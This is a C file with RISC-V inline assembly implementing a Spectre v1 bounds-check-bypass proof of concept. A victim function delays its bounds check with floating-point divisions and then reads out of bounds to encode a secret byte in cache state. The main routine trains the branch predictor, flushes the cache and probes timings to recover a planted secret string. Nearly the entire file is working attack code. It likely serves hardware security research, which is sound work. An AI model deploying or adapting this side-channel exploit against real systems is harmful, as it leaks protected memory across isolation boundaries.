#include <stdint.h>
#include <stdlib.h>
#include "encoding.h"
#include "cache.h"

uint8_t array1[16] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
char secretString[32] = "Spectre_Secret_XJCGTL";
uint8_t array2[256 * L1_BLOCK_SZ_BYTES];

void victimFunc(uint64_t idx){
    asm volatile(
        "mv      a1, %[idx]\n\t"
        "mv      a2, %[array1]\n\t"
        "mv      a3, %[array2]\n\t"
        "li      a4, 2\n\t"
        "li      a5, 1\n\t"

        /* Compute array1 size (16) via floating-point to create a long
         * dependency chain that gives the branch predictor time to mispredict
         * the bounds check below. */
        "slli a5, a5, 4\n\t"

        "slli a5, a5, 4\n\t"
        "fcvt.s.lu fa4, a4\n\t"
        "fcvt.s.lu fa5, a5\n\t"
        "fdiv.s fa5, fa5, fa4\n\t"
        "fdiv.s fa5, fa5, fa4\n\t"
        "fdiv.s fa5, fa5, fa4\n\t"
        "fdiv.s fa5, fa5, fa4\n\t"
        "fcvt.lu.s a5, fa5, rtz\n\t"

        /* Bounds check: if idx >= array1_size, skip speculative block */
        "bltu a5, a1, 1f\n\t"

        /* --- Transient execution / Spectre gadget begins --- */

        /* Load secret byte from array1[idx] (out-of-bounds for attack index) */
        "add a4, a2, a1\n\t"
        "lbu a4, 0(a4)\n\t"

        /* Encode secret in cache timing by accessing array2[secret * 64] */
        "slli a4, a4, 6\n\t"
        "add a4, a3, a4\n\t"
        "lbu a4, 0(a4)\n\t"

        /* --- Transient execution / Spectre gadget ends --- */

        "1:\n\t"

        /* Serialise: read cycle counter to fence speculative execution */
        "rdcycle a5\n\t"

        :
        : [idx]    "r" (idx),
          [array1] "r" (array1),
          [array2] "r" (array2)
        : "a1", "a2", "a3", "a4", "a5", "fa4", "fa5", "memory"
    );
}


int main(void){
    uint64_t attackIdx = (uint64_t)(secretString - (char*)array1);
    uint64_t passInIdx, trainIdx = 5, useless = 225103161;
    static uint64_t results[256];

    /* Clear results every round */
    for(uint64_t cIdx = 0; cIdx < 256; ++cIdx){
        results[cIdx] = 0;
    }

    /* Run the attack on the same idx ATTACK_SAME_ROUNDS times */
    for(uint64_t atkRound = 0; atkRound < ATTACK_SAME_ROUNDS; ++atkRound){
        useless ^= flushCache((uint64_t)array2, sizeof(array2));

        for(int64_t j = ((TRAIN_TIMES + 1) * ROUNDS) - 1; j >= 0; --j){
            passInIdx = ((j % (TRAIN_TIMES + 1)) - 1) & ~0xFFFF;
            passInIdx = (passInIdx | (passInIdx >> 16));
            passInIdx = trainIdx ^ (passInIdx & (attackIdx ^ trainIdx));
            victimFunc(passInIdx);
        }
        ProbeCache(results);
    }

    High_two_result(useless, results);

    return 0;
}
